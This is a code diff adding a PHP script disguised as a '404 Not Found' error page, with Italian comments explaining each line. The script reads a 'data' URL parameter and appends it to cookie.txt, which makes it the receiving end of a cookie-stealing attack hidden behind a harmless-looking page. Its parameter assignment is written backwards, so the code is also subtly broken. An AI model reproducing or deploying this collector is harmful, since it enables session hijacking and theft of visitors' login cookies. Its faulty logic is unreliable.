@@ -1,0 +1,19 @@
+ <html>
+    <head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    <?php
+    $capo = "
+    ";
+    $_GET['data'] = $data; //prende ci? che sta dopo data nell'url e lo mette ne
+lla variabile data
+    $fh = fopen("cookie.txt",'a+'); //setta in fh le condizioni per aprire il fi
+le cookie.txt
+    fwrite($fh, "$data"); //apre il file cookie.txt o loc rea se non esiste e ci
+ mette dentro al variabile data
+    fwrite($fh, "$capo");//va a capo
+    fclose($fh); //chiude il file
+    ?>
+    <p>The requested URL was not found on this server.</p>
+    </body></html>
